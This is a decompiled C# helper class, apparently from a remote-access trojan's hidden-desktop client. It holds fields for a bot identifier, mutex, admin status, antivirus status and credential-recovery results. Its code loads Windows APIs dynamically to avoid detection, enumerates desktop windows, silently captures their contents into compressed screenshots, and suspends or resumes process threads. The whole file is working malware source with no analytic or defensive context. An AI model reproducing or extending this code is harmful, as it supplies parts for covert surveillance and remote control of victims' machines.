// Decompiled with JetBrains decompiler
// Type: DLL.Functions.Outils
// Assembly: DLL, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EC79D3BA-C0CA-492A-8F84-32B4334A7F73
// Assembly location: C:\Users\rashid\Desktop\file.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;

namespace Client.Helper.Browser
{

  public static class Outils
  {
    
    public static string Identifier;
    public static string Mutex;
    public static string username;
    public static string isadmin;
    public static string avstatus;
    public static string RecoveryResults;
    public static int screenx = 1028;
    public static int screeny = 1028;
    public static IntPtr lastactive;
    public static IntPtr lastactivebar;
    public static int interval = 500;
    public static int quality = 50;
    public static double resize = 0.5;
    public static int TitleBarHeight;
    public static bool HigherThan81 = false;
    public static readonly Outils.DelegateIsWindowVisible IsWindowVisible = Outils.LoadApi<Outils.DelegateIsWindowVisible>("user32", nameof (IsWindowVisible));
    public static readonly Outils.DelegateEnumDesktopWindows EnumDesktopWindows = Outils.LoadApi<Outils.DelegateEnumDesktopWindows>("user32", nameof (EnumDesktopWindows));
    public static readonly Outils.DelegatePrintWindow PrintWindow = Outils.LoadApi<Outils.DelegatePrintWindow>("user32", nameof (PrintWindow));
    public static readonly Outils.DelegateGetWindowRect GetWindowRect = Outils.LoadApi<Outils.DelegateGetWindowRect>("user32", nameof (GetWindowRect));
    public static readonly Outils.DelegateWindowFromPoint WindowFromPoint = Outils.LoadApi<Outils.DelegateWindowFromPoint>("user32", nameof (WindowFromPoint));
    public static readonly Outils.DelegateGetWindow GetWindow = Outils.LoadApi<Outils.DelegateGetWindow>("user32", nameof (GetWindow));
    public static readonly Outils.DelegateIsZoomed IsZoomed = Outils.LoadApi<Outils.DelegateIsZoomed>("user32", nameof (IsZoomed));
    public static readonly Outils.DelegateGetParent GetParent = Outils.LoadApi<Outils.DelegateGetParent>("user32", nameof (GetParent));
    public static readonly Outils.DelegateGetSystemMetrics GetSystemMetrics = Outils.LoadApi<Outils.DelegateGetSystemMetrics>("user32", nameof (GetSystemMetrics));
    public static int startxpos;
    public static int startypos = 0;
    public static int startwidth;
    public static int startheight = 0;
    public static IntPtr handletomove;
    public static IntPtr handletoresize;
    public static IntPtr contextmenu;
    public static bool rightclicked = false;
    public static ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
    public static string MPath;
    public static string MFile;
    public static Process procM = new Process();
    public static string tempFile;
    public static Computer a = new Computer();
    public static List<string> collection = new List<string>();
    public static object collection2 = (object) new List<IntPtr>();

    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

    public static CreateApi LoadApi<CreateApi>(string name, string method) => Conversions.ToGenericParameter<CreateApi>((object) Marshal.GetDelegateForFunctionPointer(Outils.GetProcAddress(Outils.LoadLibraryA(ref name), ref method), typeof (CreateApi)));

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SendMessage(int hWnd, int Msg, int wparam, int lparam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
    public static extern IntPtr FindWindowEx2(
      IntPtr hWnd1,
      IntPtr hWnd2,
      IntPtr lpsz1,
      string lpsz2);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr OpenThread(
      Outils.ThreadAccess dwDesiredAccess,
      bool bInheritHandle,
      uint dwThreadId);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hHandle);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);




    public static IntPtr FindHandle(string title)
    {
      Outils.collection = new List<string>();
      Outils.collection2 = (object) new List<IntPtr>();
      Outils.EnumDelegate lpEnumCallbackFunction = (Outils.EnumDelegate) ((hWnd, lParam) =>
      {
        bool handle = false;
        try
        {
          StringBuilder stringBuilder = new StringBuilder((int) byte.MaxValue);
          IntPtr hWnd1 = hWnd;
          int num1 = checked (stringBuilder.Capacity + 1);
          IntPtr zero = IntPtr.Zero;
          int countOfChars = num1;
          StringBuilder text = stringBuilder;
          ref IntPtr local = ref zero;
          int num2 = checked ((int) Outils.SendMessageTimeoutText(hWnd1, 13, countOfChars, text, 2, 1000U, out local));
          string str = stringBuilder.ToString();
          if (Outils.IsWindowVisible(hWnd) && !string.IsNullOrEmpty(str))
          {
            object collection2 = Outils.collection2;
            object[] Arguments = new object[1]
            {
              (object) hWnd
            };
            object[] objArray = Arguments;
            bool[] CopyBack = new bool[1]{ true };
            bool[] flagArray = CopyBack;
            NewLateBinding.LateCall(collection2, (Type) null, "Add", Arguments, (string[]) null, (Type[]) null, CopyBack, true);
            if (flagArray[0])
              hWnd = (IntPtr) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (IntPtr));
            Outils.collection.Add(str);
          }
          return true;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return handle;
        }
      });
      int num = Outils.EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero) ? 1 : 0;
      int index = checked (Outils.collection.Count - 1);
      while (index >= 0)
      {
        if (Outils.collection[index].ToLower().Contains(title.ToLower()))
        {
          object obj = NewLateBinding.LateIndexGet(Outils.collection2, new object[1]
          {
            (object) index
          }, (string[]) null);
          return obj == null ? IntPtr.Zero : (IntPtr) obj;
        }
        checked { index += -1; }
      }
      return IntPtr.Zero;
    }


    public static object IsFileOpen(FileInfo file)
    {
      object obj1 = (object) null;
      if (!file.Exists)
        return obj1;
      try
      {
        file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None).Close();
        return (object) false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (ex is IOException)
        {
          object obj2 = (object) true;
          ProjectData.ClearProjectError();
          return obj2;
        }
        ProjectData.ClearProjectError();
        return obj1;
      }
    }

    public static void SuspendProcess(Process process)
    {
      IEnumerator enumerator = (IEnumerator) null;
      try
      {
        foreach (ProcessThread thread in (ReadOnlyCollectionBase) process.Threads)
        {
          IntPtr num1 = Outils.OpenThread(Outils.ThreadAccess.SUSPEND_RESUME, false, checked ((uint) thread.Id));
          if (num1 != IntPtr.Zero)
          {
            int num2 = (int) Outils.SuspendThread(num1);
            Outils.CloseHandle(num1);
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    public static void ResumeProcess(Process process)
    {
      IEnumerator enumerator = (IEnumerator) null;
      try
      {
        foreach (ProcessThread thread in (ReadOnlyCollectionBase) process.Threads)
        {
          IntPtr num1 = Outils.OpenThread(Outils.ThreadAccess.SUSPEND_RESUME, false, checked ((uint) thread.Id));
          if (num1 != IntPtr.Zero)
          {
            int num2 = (int) Outils.ResumeThread(num1);
            Outils.CloseHandle(num1);
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }




   

   
    public static Bitmap RenderScreenshot()
    {
      Bitmap bitmap1 = (Bitmap) null;
      try
      {
        List<IntPtr> t = new List<IntPtr>();
        Outils.EnumDelegate lpEnumCallbackFunction = (Outils.EnumDelegate) ((hWnd, lParam) =>
        {
          bool flag = false;
          try
          {
            if (Outils.IsWindowVisible(hWnd))
              t.Add(hWnd);
            return true;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            return flag;
          }
        });
        if (!Outils.EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero))
          return bitmap1;
        Bitmap original = new Bitmap(Outils.screenx, Outils.screeny);
        int index = checked (t.Count - 1);
        while (index >= 0)
        {
          try
          {
            Outils.RECT lpRect = new Outils.RECT();
            int num1 = Outils.GetWindowRect(t[index], ref lpRect) ? 1 : 0;
            Bitmap bitmap2 = new Bitmap(checked (lpRect.Right - lpRect.Left + 1), checked (lpRect.Bottom - lpRect.Top + 1));
            Graphics graphics = Graphics.FromImage((Image) bitmap2);
            IntPtr hdc = graphics.GetHdc();
            try
            {
              if (Outils.HigherThan81)
              {
                int num2 = Outils.PrintWindow(t[index], hdc, 2U) ? 1 : 0;
              }
              else
              {
                int num3 = Outils.PrintWindow(t[index], hdc, 0U) ? 1 : 0;
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            graphics.ReleaseHdc(hdc);
            graphics.FillRectangle(Brushes.Gray, checked (lpRect.Right - lpRect.Left - 10), checked (lpRect.Bottom - lpRect.Top - 10), 10, 10);
            Graphics.FromImage((Image) original).DrawImage((Image) bitmap2, lpRect.Left, lpRect.Top);
          }
          catch (Exception ex)             
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { index += -1; }
        }
        Bitmap bitmap3 = new Bitmap((Image) original, checked ((int) Math.Round(unchecked ((double) Outils.screenx * Outils.resize))), checked ((int) Math.Round(unchecked ((double) Outils.screeny * Outils.resize))));
        ImageCodecInfo codec = Outils.get_Codec("image/jpeg");
        EncoderParameters encoderParams = new EncoderParameters(1);
        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long) Outils.quality);
        MemoryStream memoryStream = new MemoryStream();
        bitmap3.Save((Stream) memoryStream, codec, encoderParams);
        Bitmap bitmap4 = (Bitmap) Image.FromStream((Stream) memoryStream);
        bitmap3.Dispose();
        GC.Collect();
        return bitmap4;
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception exception = ex1;
        try
        {
          bitmap1 = Outils.ReturnBMP();
          ProjectData.ClearProjectError();
          return bitmap1;
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        return bitmap1;
      }
    }

    public static ImageCodecInfo get_Codec(string type)
    {
      if (type == null)
        return (ImageCodecInfo) null;
      foreach (ImageCodecInfo codec in Outils.codecs)
      {
        if (Operators.CompareString(codec.MimeType, type, false) == 0)
          return codec;
      }
      return (ImageCodecInfo) null;
    }

    public static Bitmap ReturnBMP()
    {
      Bitmap bitmap = new Bitmap(Outils.screenx, Outils.screeny);
      using (Graphics graphics = Graphics.FromImage((Image) bitmap))
      {
        SolidBrush red = (SolidBrush) Brushes.Red;
        graphics.FillRectangle((Brush) red, 0, 0, Outils.screenx, Outils.screeny);
      }
      return bitmap;
    }

    [DllImport("user32.dll", EntryPoint = "SendMessageTimeout", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern uint SendMessageTimeoutText(
      IntPtr hWnd,
      int Msg,
      int countOfChars,
      StringBuilder text,
      int flags,
      uint uTImeoutj,
      out IntPtr result);

    public static object Isgreaterorequalto81()
    {
      object obj = (object) null;
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        Version version = osVersion.Version;
        return osVersion.Platform == PlatformID.Win32NT && version.Major == 6 && version.Minor != 0 && version.Minor != 1 ? (object) true : (object) false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        return obj;
      }
    }

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] int nCmdShow);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int X,
      int Y,
      int cx,
      int cy,
      uint uFlags);

    public delegate bool EnumDelegate(IntPtr hWnd, int lParam);

    public struct RECT
    {
      public int Left;
      public int Top;
      public int Right;
      public int Bottom;
    }

    public enum CWPFlags
    {
      CWP_ALL,
    }

    [System.Flags]
    public enum RedrawWindowFlags : uint
    {
      Invalidate = 1,
      InternalPaint = 2,
      Erase = 4,
      Validate = 8,
      NoInternalPaint = 16, // 0x00000010
      NoErase = 32, // 0x00000020
      NoChildren = 64, // 0x00000040
      AllChildren = 128, // 0x00000080
      UpdateNow = 256, // 0x00000100
      EraseNow = 512, // 0x00000200
      Frame = 1024, // 0x00000400
      NoFrame = 2048, // 0x00000800
    }

    [System.Flags]
    public enum ThreadAccess
    {
      TERMINATE = 1,
      SUSPEND_RESUME = 2,
      GET_CONTEXT = 8,
      SET_CONTEXT = 16, // 0x00000010
      SET_INFORMATION = 32, // 0x00000020
      QUERY_INFORMATION = 64, // 0x00000040
      SET_THREAD_TOKEN = 128, // 0x00000080
      IMPERSONATE = 256, // 0x00000100
      DIRECT_IMPERSONATION = 512, // 0x00000200
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool DelegateIsWindowVisible(IntPtr hWnd);

    public delegate bool DelegateEnumDesktopWindows(
      IntPtr hDesktop,
      Outils.EnumDelegate lpEnumCallbackFunction,
      IntPtr lParam);

    public delegate bool DelegatePrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

    public delegate bool DelegateGetWindowRect(IntPtr hWnd, ref Outils.RECT lpRect);

    public delegate IntPtr DelegateWindowFromPoint(Point p);

    public delegate IntPtr DelegateGetWindow(IntPtr hWnd, uint uCmd);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool DelegateIsZoomed(IntPtr hwnd);

    public delegate IntPtr DelegateGetParent(IntPtr hwnd);

    public delegate int DelegateGetSystemMetrics(int nIndex);
  }
}
